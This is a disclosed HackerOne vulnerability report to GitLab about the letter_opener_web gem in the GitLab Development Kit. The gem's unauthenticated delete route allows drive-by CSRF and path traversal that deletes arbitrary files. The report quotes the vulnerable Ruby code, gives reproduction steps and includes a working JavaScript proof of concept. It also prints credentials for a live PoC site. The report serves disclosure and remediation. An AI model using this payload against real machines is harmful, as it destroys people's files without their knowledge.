# Drive-by arbitrary file deletion in the GDK via letter_opener_web gem

## Report Details
- **Report ID**: 1353103
- **URL**: https://hackerone.com/reports/1353103
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-09-27T23:20:24.866Z
- **Disclosed**: 2021-11-12T20:29:13.357Z

## Reporter
- **Username**: vakzz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
### Summary
When running gitlab in development, an extra gem used to view emails that have been sent:

https://gitlab.com/gitlab-org/gitlab/-/blob/v14.3.0-ee/config/routes/development.rb#L14
```ruby
mount LetterOpenerWeb::Engine, at: '/rails/letter_opener'
```

One of the routes it adds is to delete a letter:
https://github.com/fgrehm/letter_opener_web/blob/v1.4.0/app/controllers/letter_opener_web/letters_controller.rb#L38
```ruby

    def destroy
      @letter.delete
      redirect_to routes.letters_path
    end

    private
   def load_letter
      @letter = Letter.find(params[:id])
      head :not_found unless @letter.exists?
    end
```

The find and delete methods for `Letter` are:

https://github.com/fgrehm/letter_opener_web/blob/v1.4.0/app/models/letter_opener_web/letter.rb#L23
```ruby
    def self.find(id)
      new(id: id)
    end

    def initialize(params)
      @id      = params.fetch(:id)
      @sent_at = params[:sent_at]
    end

    def delete
      FileUtils.rm_rf("#{LetterOpenerWeb.config.letters_location}/#{id}")
    end
```

The delete route has no CSRF protection or authentication, so the only protection is CORS. Using fetch to post with `_method=delete` and `no-cors` allows the route to be hit without triggering a preflight check as it is considered a simple request.

In order to delete files outside of `letters_location`, the id needs to contain `../` and for this to happen the path needs to be encoded as `%2e%2e%2f`.  Luckily chrome will automatically decode `%2e` to `.` and the request will never make it to the letter opener route. Firefox and Safari do not do this, and so can be used to trigger the file delete.

### Steps to reproduce

1. Setup the GDK: https://gitlab.com/gitlab-org/gitlab-development-kit/-/blob/main/doc/index.md#one-line-installation
2. Ensure that gitlab is running on http://localhost:3000/
3. Login and setup the admin user
4. Visit http://localhost:3000/rails/letter_opener and check that there are some letters waiting
5. Create a file `/tmp/something` with some contents
6. Visit https://gdk.vakzz.me/ in firefox or safari (basic auth is `bb` / `924VYZF4BcB53vwa`)
7. Enter `/tmp/something` and click delete
8. See that the file `/tmp/something` has been deleted

### Impact
Allows a malicious website to delete arbitrary files or folders on a developers computer if visited using Firefox or Safari

### Examples
POC at https://gdk.vakzz.me (basic auth is `bb` / `924VYZF4BcB53vwa`)

The delete code from the above site is:
```javascript
        function deleteFile() {
            const fileToDelete = fileInput.value;
            fileInput.value = "";

            const path = "%2e%2e%2f".repeat(20) + encodeURIComponent(fileToDelete);
            const url = `http://127.0.0.1:3000/rails/letter_opener/${path}`
            
            const form = new FormData()
            form.append("_method", "DELETE")
            return fetch(url, { method: 'POST', body: form, mode: "no-cors" });
        }
```

### What is the current *bug* behavior?
* No CSRF protection on the letter_opener routes

### What is the expected *correct* behavior?
* They should have CSRF protection

### Relevant logs and/or screenshots
Demo:
{F1463526}

### Output of checks
#### Results of GitLab environment info
```
System information
System:		Ubuntu 20.04
Proxy:		no
Current User:	vagrant
Using RVM:	no
Ruby Version:	2.7.4p191
Gem Version:	3.1.6
Bundler Version:2.1.4
Rake Version:	13.0.6
Redis Version:	6.0.15
Git Version:	2.33.0
Sidekiq Version:5.2.9
Go Version:	go1.16.8 linux/amd64

GitLab information
Version:	14.4.0-pre
Revision:	b757b9f532c
Directory:	/home/vagrant/gitlab-development-kit/gitlab
DB Adapter:	PostgreSQL
DB Version:	12.6
URL:		http://127.0.0.1:3000
HTTP Clone URL:	http://127.0.0.1:3000/some-group/some-project.git
SSH Clone URL:	ssh://git@127.0.0.1:2222/some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers: google_oauth2

GitLab Shell
Version:	13.21.1
Repository storage paths:
- default: 	/home/vagrant/gitlab-development-kit/repositories
GitLab Shell path:		/home/vagrant/gitlab-development-kit/gitlab-shell
Git:		/usr/bin/git
```

## Impact

Allows a malicious website to delete arbitrary files or folders on a developers computer if visited using Firefox or Safari

## Attachments
- delete_poc.mp4
